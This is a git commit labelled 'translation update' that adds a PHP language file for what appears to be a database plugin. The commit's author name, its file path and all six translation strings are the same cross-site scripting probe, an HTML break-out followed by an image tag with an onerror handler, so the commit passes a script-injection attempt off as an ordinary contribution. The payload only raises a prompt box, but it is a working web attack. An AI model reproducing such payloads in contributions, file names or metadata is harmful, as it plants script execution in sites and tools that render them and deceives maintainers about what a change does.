8e748b7d983f2389f4ab6538a47c07a4adb66670
img src=x onerror=prompt(1) <testersfdsa@test.net>
2014-03-29 15:05:30 +0100

    translation update

---
+++ lang/"><img src=x onerror=prompt(1);>/lang.php
@@ -0,0 +1,13 @@
+<?php
+
+/**
+ * @license    GPL 2 (http://www.gnu.org/licenses/gpl.html)
+ * 
+ * @author "><img src=x onerror=prompt(1);> <testersfdsa@test.net>
+ */
+$lang['menu']                  = '"><img src=x onerror=prompt(1);>';
+$lang['db']                    = '"><img src=x onerror=prompt(1);>';
+$lang['index']                 = '"><img src=x onerror=prompt(1);>';
+$lang['table']                 = '"><img src=x onerror=prompt(1);>';
+$lang['rename2to3']            = '"><img src=x onerror=prompt(1);>';
+$lang['convert2to3']           = '"><img src=x onerror=prompt(1);>';
